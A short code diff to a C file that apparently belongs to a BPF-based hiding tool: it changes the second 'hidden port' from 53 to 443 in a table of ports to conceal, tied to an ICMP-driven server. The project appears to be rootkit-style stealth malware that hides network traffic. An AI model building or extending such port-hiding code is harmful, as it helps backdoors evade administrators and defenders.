@@ -4,7 +4,7 @@
 #include "../include/bpf_hook.h"
 
 #define HIDDEN_PORT  123
-#define HIDDEN_PORT2 53
+#define HIDDEN_PORT2 443
 
 /* Per-slot port table (must match icmp.c SRV_PORT / SRV_PORT2) */
 static const u16 bpf_hidden_ports[MAX_INSTANCES] = { HIDDEN_PORT, HIDDEN_PORT2 };
